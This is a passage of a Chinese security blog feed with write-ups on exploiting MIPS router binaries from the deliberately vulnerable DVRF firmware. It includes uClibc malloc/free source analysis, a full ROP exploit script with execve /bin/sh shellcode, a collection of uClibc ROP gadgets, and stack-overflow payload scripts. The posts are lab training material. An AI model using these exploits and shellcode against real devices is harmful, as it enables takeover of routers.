mem))</div><div class="line">      break;</div><div class="line"></div><div class="line">  if (fa &amp;&amp; HEAP_FREE_AREA_START (fa) &lt;= end)</div><div class="line">   //这里是相邻的情况,不可能小于，所以进入这的就是 HEAP_FREE_AREA_START (fa) == end, 则 mem, 和 fa所表示的内存块相邻</div><div class="line">    &#123;</div><div class="line">    /* </div><div class="line">		如果 fa 和 mem 是连续的，那么将 mem 空间并入 fa 节点（增加fa的大小即可）管理, 如图所示，地址从左至右依次增大</div><div class="line">	</div><div class="line">		  +---------------+--------------+---------------+</div><div class="line">		  | 	  |prev_fa| 	 mem	 |fa_chunk| fa   |</div><div class="line">		  +---------------+--------------+---------------+</div><div class="line">						  ^______________________________^ </div><div class="line">	</div><div class="line">		prev_fa 与 fa 的链接关系不变，只要更改 fa 中的 size 就可以了</div><div class="line">	   */</div><div class="line"></div><div class="line">      size_t fa_size = fa-&gt;size + size;</div><div class="line">      if (HEAP_FREE_AREA_START (fa) == end)</div><div class="line">	&#123;</div><div class="line">	  if (prev_fa &amp;&amp; mem == HEAP_FREE_AREA_END (prev_fa))</div><div class="line">	    &#123;</div><div class="line"></div><div class="line">		 /* 如果 fa 前一个节点和 mem 是连续的，那么将 fa 前一个节点的空间</div><div class="line">			     也并入 fa 节点管理</div><div class="line"></div><div class="line">			   +---------------+---------------+--------------+---------------+</div><div class="line">			   |       |pre2_fa|       |prev_fa|      mem     |       |   fa  |</div><div class="line">			   +---------------+---------------+--------------+---------------+</div><div class="line">		                       ^______________________________________________^</div><div class="line"></div><div class="line">			    将 prev_fa 从链表中移出，同时修改 fa 中的 size</div><div class="line">          */</div><div class="line">	      fa_size += prev_fa-&gt;size;</div><div class="line">	      __heap_link_free_area_after (heap, fa, prev_fa-&gt;prev);</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">      else</div><div class="line">	&#123;</div><div class="line">	  struct heap_free_area *next_fa = fa-&gt;next;</div><div class="line"></div><div class="line">	   /* 如果 mem 与 next_fa 是连续的，将 mem 并入 next_fa 节点管理</div><div class="line"></div><div class="line"> 	   +---------------+--------------+--------------+---------------+</div><div class="line">	   |       |prev_fa|      |   fa  |      mem     |       |next_fa|</div><div class="line">	   +---------------+--------------+--------------+---------------+</div><div class="line">                       ^_____________________________________________^ </div><div class="line"></div><div class="line">	   将 fa 从链表中移出，同时修改 next_fa 中的 size</div><div class="line">	  */</div><div class="line">	  if (next_fa &amp;&amp; end == HEAP_FREE_AREA_START (next_fa))</div><div class="line">	    &#123;</div><div class="line">	      fa_size += next_fa-&gt;size;</div><div class="line">	      __heap_link_free_area_after (heap, next_fa, prev_fa);</div><div class="line">	      fa = next_fa;</div><div class="line">	    &#125;</div><div class="line">	  else</div><div class="line">	    /* FA can&apos;t be merged; move the descriptor for it to the tail-end</div><div class="line">	       of the memory block.  */</div><div class="line"></div><div class="line"></div><div class="line">	      /* 如果 mem 与 next_fa 不连续，将 fa 结点移到 mem 尾部</div><div class="line"></div><div class="line"> 	   +---------------+--------------+--------------+---------------+</div><div class="line">	   |       |prev_fa|      |   fa  | mem | unused |       |next_fa|</div><div class="line">	   +---------------+--------------+--------------+---------------+</div><div class="line">                          ^___________________^^________________________^</div><div class="line"></div><div class="line">	       需要重新链接 fa 与 prev_fa 和 next_fa 的关系</div><div class="line">            */</div><div class="line">	    &#123;</div><div class="line">	      /* The new descriptor is at the end of the extended block,</div><div class="line">		 SIZE bytes later than the old descriptor.  */</div><div class="line">	      fa = (struct heap_free_area *)((char *)fa + size);</div><div class="line">	      /* Update links with the neighbors in the list.  */</div><div class="line">	      __heap_link_free_area (heap, fa, prev_fa, next_fa);</div><div class="line">	    &#125;</div><div class="line">	&#125;</div><div class="line">      fa-&gt;size = fa_size;</div><div class="line">    &#125;</div><div class="line">  else</div><div class="line">     /* 如果fa和 mem之间有空隙或者 mem&gt; HEAP_FREE_AREA_END (fa)，那么可以简单地</div><div class="line">       把 mem 插入 prev_fa 和 fa之间 */</div><div class="line">    fa = __heap_add_free_area (heap, mem, size, prev_fa, fa);</div><div class="line"></div><div class="line">  return fa;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__heap_link_free_area</code> 就是简单的链表操作。没有什么用。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static __inline__ void</div><div class="line">__heap_link_free_area (struct heap_free_area **heap, struct heap_free_area *fa,</div><div class="line">		       struct heap_free_area *prev,</div><div class="line">		       struct heap_free_area *next)</div><div class="line">&#123;</div><div class="line">  fa-&gt;next = next;</div><div class="line">  fa-&gt;prev = prev;</div><div class="line"></div><div class="line">  if (prev)</div><div class="line">    prev-&gt;next = fa;</div><div class="line">  else</div><div class="line">    *heap = fa;</div><div class="line">  if (next)</div><div class="line">    next-&gt;prev = fa;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>感觉唯一可能的利用点在于,前后相邻的情况，需要先把 <code>prev_fa</code> 拆链表，我们如果可以伪造 <code>prev_fa-&gt;prev</code>，就可以得到一次内存写的机会，不过也只能写入 <code>fa</code> 的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fa_size += prev_fa-&gt;size;</div><div class="line">__heap_link_free_area_after (heap, fa, prev_fa-&gt;prev);</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">static __inline__ void</div><div class="line">__heap_link_free_area_after (struct heap_free_area **heap,</div><div class="line">			     struct heap_free_area *fa,</div><div class="line">			     struct heap_free_area *prev)</div><div class="line">&#123;</div><div class="line">  if (prev)</div><div class="line">    prev-&gt;next = fa;</div><div class="line">  else</div><div class="line">    *heap = fa;</div><div class="line">  fa-&gt;prev = prev;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>怎么感觉没有可利用的点，还是太菜了。以后如果遇到实例一定要补充进来。</p>
<p>tips:</p>
<ul>
<li><p>分析库源码时看不太懂可以先编译出来，然后配合这 <code>ida</code> 看，所以要编译成 <code>x86</code> 或者 <code>arm</code> 方便 <code>f5</code> 对照看。比如这次，我把 <code>uClibc</code> 编译成 <code>arm</code> 版后，使用 <code>ida</code> 一看，发现 <code>uClibc</code> 怎么使用的是 <code>glibc</code> 的那一套，一看源码目录发现，原来它已经切换到 <code>glibc</code> 这了。</p>
</li>
<li><p>忽然想起来交叉编译环境感觉可以用 docker 部署，网上一搜发现一大把，瞬间爆炸。</p>
</li>
</ul>
<p>参考链接：</p>
<p><a href="http://blog.chinaunix.net/uid-20543183-id-1930765.html" target="_blank" rel="external">http://blog.chinaunix.net/uid-20543183-id-1930765.html</a></p>
<p><a href="http://hily.me/blog/2007/06/uclibc-malloc-free/" target="_blank" rel="external">http://hily.me/blog/2007/06/uclibc-malloc-free/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> uclibc源码分析 </tag>
            
            <tag> malloc &amp;&amp; free </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之rop技术实战]]></title>
      <url>/2017/10/28/step_by_step_pwn_router_part4.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>这次程序也是 DVRF 里面的，他的路径是 <code>pwnable/ShellCode_Required/stack_bof_02</code> , 同样是一个简单的栈溢出，不过这个程序里面没有提供 <code>getshell</code> 的函数，需要我们执行shellcode来实现。这个正好实战下前文: <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html" target="_blank" rel="external">一步一步pwn路由器之路由器环境修复&amp;&amp;rop技术分析</a>,中分析的在mips下的通用的rop技术。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>qemu</code> 运行目标程序，并等待 <code>gdb</code> 来调试。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static -g 1234 ./pwnable/ShellCode_Required/stack_bof_02  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure></p>
<p>使用pwntools的 cyclic 功能，找到偏移<br><img src="http://oy9h5q2k4.bkt.clouddn.com/15091628511130mev14fe.png?imageslim" alt="paste image"><br>验证一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509163815793mv4b39p0.png?imageslim" alt="paste image"><br>OK, 现在我们已经可以控制程序的 <code>$pc</code>寄存器了，下一步就是利用的方法了。使用前文的那个 rop 链，我们需要可以控制 <code>$s1</code>寄存器。但是这里我们并没有办法控制。不过在 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-MIPS-rop-gadgets%E8%AE%B0%E5%BD%95%E8%B4%B4-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0.html" target="_blank" rel="external">这里</a>提到，在 <code>uclibc</code> 的 <code>scandir</code> 或者 <code>scandir64</code> 的函数末尾有一个<code>gadgets</code> 可以操控几乎所有寄存器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">.text:0000AFE0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">.text:0000AFE4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">.text:0000AFE8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">.text:0000AFEC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">.text:0000AFF0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">.text:0000AFF4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">.text:0000AFF8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">.text:0000AFFC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">.text:0000B000                 lw      $s1, 0x40+var_24($sp)</div><div class="line">.text:0000B004                 lw      $s0, 0x40+var_28($sp)</div><div class="line">.text:0000B008                 jr      $ra</div><div class="line">.text:0000B00C                 addiu   $sp, 0x40</div><div class="line">.text:0000B00C  # End of function scandir64</div></pre></td></tr></table></figure>
<p>于是利用的思路就很明确了。首先使用这段 <code>rop gadgets</code> 设置好寄存器，然后进入前文所说的 <code>rop</code> 链中执行。<br>最后的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">context.endian = &quot;little&quot;</div><div class="line">context.arch = &quot;mips&quot;</div><div class="line"></div><div class="line">payload = &quot;&quot;</div><div class="line"></div><div class="line"># NOP sled (XOR $t0, $t0, $t0; as NOP is only null bytes)</div><div class="line">for i in range(30):</div><div class="line">    payload += &quot;\x26\x40\x08\x01&quot;</div><div class="line"></div><div class="line"># execve shellcode translated from MIPS to MIPSEL</div><div class="line"># http://shell-storm.org/shellcode/files/shellcode-792.php</div><div class="line">payload += &quot;\xff\xff\x06\x28&quot;  # slti $a2, $zero, -1</div><div class="line">payload += &quot;\x62\x69\x0f\x3c&quot;  # lui $t7, 0x6962</div><div class="line">payload += &quot;\x2f\x2f\xef\x35&quot;  # ori $t7, $t7, 0x2f2f</div><div class="line">payload += &quot;\xf4\xff\xaf\xaf&quot;  # sw $t7, -0xc($sp)</div><div class="line">payload += &quot;\x73\x68\x0e\x3c&quot;  # lui $t6, 0x6873</div><div class="line">payload += &quot;\x6e\x2f\xce\x35&quot;  # ori $t6, $t6, 0x2f6e</div><div class="line">payload += &quot;\xf8\xff\xae\xaf&quot;  # sw $t6, -8($sp)</div><div class="line">payload += &quot;\xfc\xff\xa0\xaf&quot;  # sw $zero, -4($sp)</div><div class="line">payload += &quot;\xf4\xff\xa4\x27&quot;  # addiu $a0, $sp, -0xc</div><div class="line">payload += &quot;\xff\xff\x05\x28&quot;  # slti $a1, $zero, -1</div><div class="line">payload += &quot;\xab\x0f\x02\x24&quot;  # addiu;$v0, $zero, 0xfab</div><div class="line">payload += &quot;\x0c\x01\x01\x01&quot;  # syscall 0x40404</div><div class="line">shellcode = payload</div><div class="line"></div><div class="line"></div><div class="line">padding = &quot;O&quot; * 508</div><div class="line">payload = padding</div><div class="line">payload += p32(0x766effe0)</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x7670303c)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += &apos;A&apos; * 4  # $s3</div><div class="line">payload += &apos;A&apos; * 4  # $s4</div><div class="line">payload += &apos;A&apos; * 4  # $s5</div><div class="line">payload += &apos;A&apos; * 4  # $s6</div><div class="line">payload += &apos;A&apos; * 4  # $s7</div><div class="line">payload += &apos;A&apos; * 4  # $fp</div><div class="line">payload += p32(0x76714b10)  # $ra for jmp</div><div class="line"></div><div class="line"># stack for gadget 2</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += &apos;A&apos; * 4  # $s0</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra</div><div class="line"></div><div class="line"></div><div class="line"># stack for gadget 2 for second</div><div class="line">payload += &apos;B&apos; * 0x18</div><div class="line">payload += p32(0x767064a0)  # $s0  for jmp stack</div><div class="line">payload += p32(0x0002F2B0 + 0x766e5000)  # $s1</div><div class="line">payload += &apos;A&apos; * 4  # $s2</div><div class="line">payload += p32(0x766fbdd0)  # $ra for get stack addr</div><div class="line"></div><div class="line"># stack for shellcode</div><div class="line">payload += shellcode</div><div class="line"></div><div class="line">payload = &quot;A&quot; * 508 + &apos;B&apos; * 4</div><div class="line"></div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div><div class="line"></div><div class="line"></div><div class="line"># base 0x766e5000</div></pre></td></tr></table></figure></p>
<p>可以执行完毕 <code>shellcode</code> , 不过执行完后就异常了。神奇。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在调试rop时可以先在调试器中修改寄存器，内存数据来模拟实现，然后在写到脚本里面。</p>
<p>参考链接：</p>
<p><a href="https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/" target="_blank" rel="external">https://www.pnfsoftware.com/blog/firmware-exploitation-with-jeb-part-2/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MIPS rop gadgets记录贴&&持续更新]]></title>
      <url>/2017/10/27/MIPS_rop_gadgets_collects.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本帖记录一些常用的,效果好的 rop gadgets.</p>
<p><strong>uClibc</strong></p>
<p><strong>从栈中设置<code>$t9</code> 并跳到 <code>$t9</code> 的gadgets , <code>__thread_start</code> 函数第二行</strong></p>
<p>使用 <a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-27-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AE%9E%E6%88%98.html" target="_blank" rel="external">案例</a></p>
<p>使用tips:</p>
<ul>
<li>调用函数时，进入函数内部时要求 <code>$t9</code> 指向函数的起始地址。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">lw      $t9, arg_0($sp)</div><div class="line">jalr    $t9</div></pre></td></tr></table></figure>
<p><strong>四个组合使用，调用栈中 shellcode 的 rop_gadget , 需要可以控制 <code>$s1</code>,</strong></p>
<p>详细分析在<a href="https://jinyu00.github.io/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/2017-10-26-%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5pwn%E8%B7%AF%E7%94%B1%E5%99%A8%E4%B9%8B%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83%E4%BF%AE%E5%A4%8D-rop%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90.html" target="_blank" rel="external">这里
</a></p>
<p>rop_gadget 1, <strong>设置 参数一 为 1</strong>，位于 <code>__uClibc_main</code> ,可以使用 <code>mipsrop.find(&quot;li $a0, 1&quot;)</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">LOAD:00055C60                 li      $a0, 1</div><div class="line">LOAD:00055C64                 move    $t9, $s1</div><div class="line">LOAD:00055C68                 jalr    $t9 ; sub_55960</div><div class="line">LOAD:00055C5C                 lui     $s0, 2</div></pre></td></tr></table></figure></p>
<p>rop_gadget 2，<strong>从栈中设置寄存器</strong>，使用 <code>mipsrop.tail()</code> 查找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">LOAD:0001E20C                 move    $t9, $s1</div><div class="line">LOAD:0001E210                 lw      $ra, 0x28+var_4($sp)</div><div class="line">LOAD:0001E214                 lw      $s2, 0x28+var_8($sp)</div><div class="line">LOAD:0001E218                 lw      $s1, 0x28+var_C($sp)</div><div class="line">LOAD:0001E21C                 lw      $s0, 0x28+var_10($sp)</div><div class="line">LOAD:0001E220                 jr      $t9</div><div class="line">LOAD:0001E224                 addiu   $sp, 0x28</div></pre></td></tr></table></figure></p>
<p>rop_gadget 3，<strong>获取栈地址</strong>，使用 <code>mipsrop.stackfinder()</code> 查找</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">LOAD:000164C0                 addiu   $s2, $sp, 0x198+var_180</div><div class="line">LOAD:000164C4                 move    $a2, $v1</div><div class="line">LOAD:000164C8                 move    $t9, $s0</div><div class="line">LOAD:000164CC                 jalr    $t9 ; mempcpy</div><div class="line">LOAD:000164D0                 move    $a0, $s2</div></pre></td></tr></table></figure>
<p>rop_gadget 4，<strong>通过 <code>$t9</code>, 跳转到 <code>$s2</code></strong>，使用 <code>mipsrop.find(&quot;move    $t9, $s2&quot;)</code> 查找, 位于 <code>readdir</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">LOAD:000118A4                 move    $t9, $s2</div><div class="line">LOAD:000118A8                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p><strong>从栈中取数据到寄存器, <code>opendir</code>  函数尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:0000AA6C                 lw      $ra, 0xC0+var_4($sp)</div><div class="line">.text:0000AA70                 lw      $s2, 0xC0+var_8($sp)</div><div class="line">.text:0000AA74                 lw      $s1, 0xC0+var_C($sp)</div><div class="line">.text:0000AA78                 lw      $s0, 0xC0+var_10($sp)</div><div class="line">.text:0000AA7C                 jr      $ra</div><div class="line">.text:0000AA80                 addiu   $sp, 0xC0</div><div class="line">.text:0000AA80  # End of function opendir</div></pre></td></tr></table></figure></p>
<p><strong>从栈中设置基本上所有的重要寄存器，位于 <code>scandir</code> 或者 <code>scandir64</code>尾部</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">LOAD:00011BB0                 lw      $ra, 0x40+var_4($sp)</div><div class="line">LOAD:00011BB4                 lw      $fp, 0x40+var_8($sp)</div><div class="line">LOAD:00011BB8                 lw      $s7, 0x40+var_C($sp)</div><div class="line">LOAD:00011BBC                 lw      $s6, 0x40+var_10($sp)</div><div class="line">LOAD:00011BC0                 lw      $s5, 0x40+var_14($sp)</div><div class="line">LOAD:00011BC4                 lw      $s4, 0x40+var_18($sp)</div><div class="line">LOAD:00011BC8                 lw      $s3, 0x40+var_1C($sp)</div><div class="line">LOAD:00011BCC                 lw      $s2, 0x40+var_20($sp)</div><div class="line">LOAD:00011BD0                 lw      $s1, 0x40+var_24($sp)</div><div class="line">LOAD:00011BD4                 lw      $s0, 0x40+var_28($sp)</div><div class="line">LOAD:00011BD8                 jr      $ra</div><div class="line">LOAD:00011BDC                 addiu   $sp, 0x40</div><div class="line">LOAD:00011BDC  # End of function scandir</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mips rop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之栈溢出实战]]></title>
      <url>/2017/10/27/step_by_step_pwn_router_part3.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文由 <strong>本人</strong> 首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274</a></p>
<hr>
<p>本文以 <a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="external">DVRF</a> 中的第一个漏洞程序 <code>stack_bof_01</code> 为例，在实战 <code>MIPS</code> 架构中栈溢出的简单利用。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>去github上面把 DVRF 下载下来，然后用 <code>binwalk</code> 解开</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15090843759335sjlc5jz.png?imageslim" alt="paste image"></p>
<p>在 <code>pwnable</code> 目录下就是相应的示例程序</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509084462823wk11dwv2.png?imageslim" alt="paste image"><br>在解开的文件系统的根目录下使用 <code>chroot</code> 和 <code>qemu</code> 运行 程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chroot . ./qemu-mipsel-static ./pwnable/Intro/stack_bof_01  &quot;`cat ./pwnable/Intro/input`&quot;</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509084652810a9d812lx.png?imageslim" alt="paste image"></p>
<p>使用了<code>cat</code> 命令读取文件作为命令行参数，传给目标程序，这样可以使我们输入一些不可见字符用于劫持程序流。</p>
<p><code>stack_bof_01</code> 是一个很简单的栈溢出漏洞程序，它把用户从命令行传过去的参数直接使用 <code>strcpy</code> 拷贝到栈缓冲区，从而栈溢出。经过调试，输入204个字符后就可以覆盖到 <code>ra</code> 寄存器保存到栈栈上的值，进而可以控制 <code>$pc</code> 的值。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509085110075dfzfw3j4.png?imageslim" alt="paste image"><br>修改文件内容的 <code>python</code> 脚本如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">padding = &quot;O&quot; * 204</div><div class="line">payload = padding + &quot;B&quot;*4</div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure>
<p>接下来就是考虑该如何利用的问题了。程序中包含了一个 执行 <code>system(&quot;/bin/sh&quot;)</code> 的函数 <code>dat_shell</code>, 如果是在 <code>x86</code> 平台下的话，我们直接设置 <code>$pc</code> 寄存器到它的地址就可以了。在 <code>MIPS</code> 如果直接指过去或怎么样呢？我们试试</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509085500227rnxajrt2.png?imageslim" alt="paste image"></p>
<p>访问了非法内存，异常了。<br>原因在于，在 MIPS 中，函数内部会通过 <code>$t9</code> 寄存器和 <code>$gp</code> 寄存器来找数据，地址等。同时在 <code>mips</code> 的手册内默认 <code>$t9</code> 的值为当前函数的开始地址，这样才能正常的索引，所以我们需要先用一个 <code>rop_gadget</code> 设置 <code>$t9</code>, 然后再跳到 <code>dat_shell</code> 函数。<br>在libc 中可以找到这样一个gadgets<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">.text:00006B20                 lw      $t9, arg_0($sp)</div><div class="line">.text:00006B24                 jalr    $t9</div></pre></td></tr></table></figure></p>
<p>加上libc的基地址就行了。用qemu-mipsel-static模拟程序是看不到目标程序的maps的，所以我们可以通过打印 <code>got</code> 表的函数指针，然后计算偏移得到 <code>libc</code> 的基地址。</p>
<p>所以我们现在的利用流程就是:</p>
<ul>
<li>修改返回地址到 <code>rop_gadget</code>, 设置 <code>$r9</code> 为 <code>dat_shell</code> 函数的地址</li>
<li>跳转到 <code>dat_shell</code> 函数，执行<code>system</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">padding = &quot;O&quot; * 204</div><div class="line">gadget1 = &quot;\x20\xbb\x6e\x76&quot;</div><div class="line">dat_shell_addr = &quot;\x50\x09\x40&quot;  # Partial overwrite with little-endian arch</div><div class="line">payload = padding + gadget1 + dat_shell_addr</div><div class="line">with open(&quot;input&quot;, &quot;wb&quot;) as f:</div><div class="line">    f.write(payload)</div></pre></td></tr></table></figure>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509086115477pcnvhh8c.png?imageslim" alt="paste image"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul>
<li><p>学习到了 <code>$t9</code> 寄存器的重要作用以后再使用 <code>rop</code> 调用函数时，要使用 <code>jalr $t9</code> 类的 <code>gadgets</code> 以保证进入函数后， <code>$t9</code> 的值为函数的起始地址，避免出错。</p>
</li>
